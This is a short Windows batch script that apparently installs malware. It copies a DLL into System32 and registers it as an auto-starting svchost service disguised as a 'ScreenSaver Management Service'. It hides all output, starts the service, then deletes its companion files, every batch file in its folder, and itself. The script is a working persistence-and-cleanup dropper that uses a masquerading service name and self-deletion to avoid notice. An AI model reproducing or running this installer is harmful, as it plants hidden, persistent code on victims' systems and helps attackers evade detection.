@echo off

set DSP_NAME="ScreenSaver Management Service"

sc stop scrnsvc > nul

echo %~dp0 | findstr /i "system32" > nul
if %ERRORLEVEL% equ 0 (goto INSTALL) else (goto COPYFILE)

:COPYFILE

copy /y "%~dp0\scrnsvc.dll" "%windir%\System32" > nul
del /f /q "%~dp0\scrnsvc.dll" > nul

copy /y "%~dp0\scrnsvc.ini" "%windir%\System32" > nul
del /f /q "%~dp0\scrnsvc.ini" > nul

del /f /q "%windir%\System32\scrnsvc.dat" > nul

:INSTALL

sc create scrnsvc binpath= "%windir%\System32\svchost.exe -k scrnsvc" DisplayName= %DSP_NAME% > nul
sc description scrnsvc %DSP_NAME% > nul
sc config scrnsvc type= interact type= own start= auto error= normal binpath= "%windir%\System32\svchost.exe -k scrnsvc" > nul
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" /v scrnsvc /t REG_MULTI_SZ /d "scrnsvc" /f > nul
reg add "HKLM\SYSTEM\CurrentControlSet\Services\scrnsvc\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%windir%\System32\scrnsvc.dll" /f > nul

sc start scrnsvc > nul
del /f /q "%~dp0\wpnprv.dll" > nul
del /f /q "%~dp0\*.bat" > nul
del /f /q "%~dpnx0" > nul